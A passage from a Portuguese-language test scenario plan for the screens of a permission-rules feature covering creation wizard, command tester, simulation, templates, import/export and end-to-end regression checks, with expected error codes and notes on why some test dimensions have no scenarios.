| S-181 | a gaveta de ajuda tem todos os tópicos, traduzidos; cada "saiba mais" abre a seção certa | eq | integração | — | B-26 | ⬜ |
| S-182 | todo controle de ícone tem tooltip e nome acessível | eq | integração | — | B-26 | ⬜ |
| S-183 | axe sem violação na lista, com o detalhe aberto e com um diálogo aberto, nos temas claro e escuro | eq | integração | — | B-26 | ⬜ |
| S-184 | os atalhos da tela estão na paleta e funcionam | eq | integração | — | B-26 | ⬜ |

## O assistente de criação — B-27

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-185 | padrão fora da gramática mostra o erro traduzido **antes** de enviar, vindo da prévia do servidor | err | integração | `PERMISSION_RULE_PATTERN_INVALID` | B-27 | ⬜ |
| S-186 | o campo muda com a tool (comando, caminho, URL); tool sem campo casável só oferece a tool inteira, com o aviso de largura | eq | integração | — | B-27 | ⬜ |
| S-187 | a pasta só vem do seletor do plano 06; não há campo de texto para ela; pasta fora da allowlist não aparece | eq | integração | — | B-27 | ⬜ |
| S-188 | o segundo passo sempre aparece, para `allow` e `deny`, com o alcance por extenso, os achados e o resumo da simulação; voltar não envia nada | est | integração | — | B-27 | ⬜ |
| S-189 | `allow` `broad` pede a confirmação explícita no segundo passo; `unbounded` é bloqueado com a explicação | fron | integração | `PERMISSION_RULE_TOO_BROAD` (novo) | B-27 | ⬜ |
| S-190 | rascunho idêntico a uma regra ativa desabilita salvar e oferece abrir ou estender a que existe | idem | integração | — | B-27 | ⬜ |
| S-191 | atalhos de validade e data livre limitada ao teto; acima dele, erro na linha | fron | integração | `PERMISSION_RULE_EXPIRY_TOO_LONG` | B-27 | ⬜ |
| S-192 | preenchimento pela search (`/rules/new?…`) é validado campo a campo; o inválido é descartado, não aplicado | fron | integração | — | B-27 | ⬜ |
| S-193 | "criar regra a partir desta invocação", na trilha, preenche o padrão mais estreito dela | eq | integração | — | B-27 | ⬜ |
| S-194 | clique duplo em criar → uma regra | idem | integração | — | B-27 | ⬜ |
| S-195 | a pasta saiu da allowlist entre o seletor e o envio → o assistente fica preenchido, com o erro traduzido | err | integração | `WORKSPACE_NOT_ALLOWED` | B-27 | ⬜ |

## Testar um comando pela tela — B-28

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-196 | o testador mostra o veredito, a regra que responde, todas as que casam, o motivo e as ressalvas | eq | integração | — | B-28 | ⬜ |
| S-197 | trocar o modo para `plan` muda o veredito de um `allow` | est | integração | — | B-28 | ⬜ |
| S-198 | dentro do assistente, o teste considera o rascunho | eq | integração | — | B-28 | ⬜ |
| S-199 | pasta recusada no teste mostra o erro traduzido | err | integração | `WORKSPACE_NOT_ALLOWED` | B-28 | ⬜ |

## Simulação pela tela — B-29

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-200 | "se esta regra existisse": resumo e lista; trilha vazia explica por que não há o que simular | eq | integração | — | B-29 | ⬜ |
| S-201 | "se eu revogar esta", no detalhe, lista o que voltaria a ser perguntado | eq | integração | — | B-29 | ⬜ |
| S-202 | o seletor de quantas invocações ler respeita o teto | fron | integração | — | B-29 | ⬜ |

## Modelos e duplicar pela tela — B-30

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-203 | um modelo abre a revisão de várias regras, cada uma desligável, com segundo passo; nada nasce antes de confirmar | est | integração | — | B-30 | ⬜ |
| S-204 | duplicar abre o assistente com os campos e validade nova; sem mudança, o achado `identical` aparece | idem | integração | — | B-30 | ⬜ |

## Exportar e importar pela tela — B-31

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-205 | exportar baixa um arquivo com data no nome, da seleção ou do filtro atual | eq | integração | — | B-31 | ⬜ |
| S-206 | a prévia da importação mostra o veredito por item, remapeia pasta pelo seletor, confirma o `broad` item a item e pede o segundo passo com a contagem e o alcance | est | integração | — | B-31 | ⬜ |
| S-207 | importação recusada mostra os motivos por item, e nada foi criado | err | integração | `PERMISSION_RULE_IMPORT_REJECTED` (novo) | B-31 | ⬜ |
| S-208 | arquivo grande demais é recusado com mensagem traduzida | err | integração | `PAYLOAD_TOO_LARGE` | B-31 | ⬜ |

## Usabilidade e ajuda do assistente — B-32

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-209 | ajuda, tooltips e exemplos do assistente traduzidos; axe sem violação em cada passo | eq | integração | — | B-32 | ⬜ |
| S-210 | só com o teclado se completa o assistente, do primeiro passo à criação | eq | integração | — | B-32 | ⬜ |

## E2E — B-33…B-36

| ID | Cenário | Dim | Nível | Erro esperado | Tarefa | Estado |
|---|---|---|---|---|---|---|
| S-211 | criar pela tela com o segundo passo → a sessão roteirizada tem a próxima invocação respondida com `auto: true`, o uso vai a 1 e a trilha mostra a concessão com a origem | eq | e2e | — | B-33 | ⬜ |
| S-212 | testar o comando antes (pergunta) e depois de criar (permitido) | est | e2e | — | B-33 | ⬜ |
| S-213 | o modelo "bloquear rede" cria `deny` que recusa um `WebFetch` da sessão roteirizada | eq | e2e | — | B-33 | ⬜ |
| S-214 | encurtar e estender com segundo passo; os dois na trilha | est | e2e | — | B-34 | ⬜ |
| S-215 | revogar em lote com a prévia → a próxima invocação pergunta; desfazer → volta a ser respondida; trilha com revogação e restauração | est | e2e | — | B-34 | ⬜ |
| S-216 | importar arquivo com pasta de outra máquina: a prévia marca, o remapeamento corrige, as regras nascem | eq | e2e | — | B-34 | ⬜ |
| S-217 | padrão largo demais recusado com mensagem traduzida; pasta fora da allowlist nem é oferecida | err | e2e | `PERMISSION_RULE_TOO_BROAD` (novo) | B-35 | ⬜ |
| S-218 | outra pessoa não vê as regras do usuário na lista, no teste de comando, na simulação nem na exportação | eq | e2e | — | B-35 | ⬜ |
| S-219 | **regressão** — regra criada pela tela não responde em sessão no modo `plan` | est | e2e | — | B-35 | ⬜ |
| S-220 | **regressão** — as specs do plano 03 (`rules.spec`, `rule-cycle.spec`, `trail-isolation.spec`) continuam verdes, e o segundo passo do card não mudou | eq | e2e | — | B-36 | ⬜ |
| S-221 | axe em `/rules` e `/rules/new`; viewport de celular sem scroll horizontal | eq | e2e | — | B-36 | ⬜ |
| S-222 | o deep link antigo `/rules/$ruleId` abre o detalhe da regra certa, com o estado de revogada explicado | eq | e2e | — | B-36 | ⬜ |

---

## Dimensões sem cenário — justificativa

O protocolo exige justificar dimensão vazia, não omiti-la.

| Requisito | Dimensão ausente | Por quê |
|---|---|---|
| Contrato e documentos (B-01…B-07) | `fron`, `est`, `conc`, `idem` | a fase escreve documento, catálogo e migration de `CHECK`; o comportamento com fronteira, estado e concorrência é das rotas, e está nas tarefas que as implementam (F1) |
| Casamento (B-08) | `err`, `conc`, `idem` | o matcher é função pura, sem I/O nem estado compartilhado: não tem erro a devolver (padrão inválido já é recusado na criação — S-118 do lado do rascunho, S-47 do [plano 03](../03-rules-and-audit/scenarios.md)), nem corrida, e a mesma entrada dá a mesma saída por construção — o que o S-120 afirma para a análise que o usa |
| Listagem (B-10) | `conc`, `idem` | é leitura: não altera nada, e a leitura sob escrita que importa (paginação) está nas invocações (S-59). O teto com `truncated` fixa o recorte (S-50) |
| Uso (B-11) | `est`, `idem` | leitura pura sobre uma tabela append-only; o estado que muda o número (regra revogada, expirada) é da regra, provado em S-86 e S-101 |
| Análise (B-15) | `conc` | função pura sobre um retrato da lista; quem concorre é a escrita, provada nas rotas (S-74, S-85) |
| Simulação (B-16) | `est`, `conc` | leitura pura com `limit`; estado e concorrência de regra estão em B-12/B-13 e no teste (S-109) |
| Modelos (B-17) | `fron`, `est`, `conc`, `idem` | catálogo estático versionado no código; aplicar um modelo **é** uma importação, e as quatro dimensões estão em B-18 (S-141, S-145, S-146) |
| Lembrete (B-19) | `err` | o job não tem chamador a quem devolver código; a falha de push é transição de estado (S-154), e o log a registra |
| Hooks (B-20) | `fron`, `est`, `idem` | o hook repassa o que o backend decide; fronteira e estado estão nas rotas (F1) e nas telas (S-160, S-169) |
| Telas (B-21…B-32) | `conc` nas tarefas B-22, B-25, B-26, B-28…B-32 | a corrida que existe na web — duas respostas para o mesmo filtro, dois cliques no mesmo botão — está em S-158, S-174, S-194; as outras tarefas não disparam escrita concorrente |
| E2E (B-33…B-36) | `fron`, `conc`, `idem` | fronteiras (teto de validade, de lote, de importação, de simulação) e corridas (revogar × estender, lote × avulso, importação dupla) são exatas e baratas em integração (S-66, S-74, S-84, S-126, S-141, S-146); pela porta do usuário só acrescentariam minutos ao portão 9 |

---

## Regras

- Cenário descoberto durante a implementação **entra aqui**, não vira teste órfão.
- Cenário coberto muda de estado **na mesma entrega** que o cobriu.
- Todo `err` cita o `code` do [catálogo](../../architecture/shared/04-errors-and-http.md).
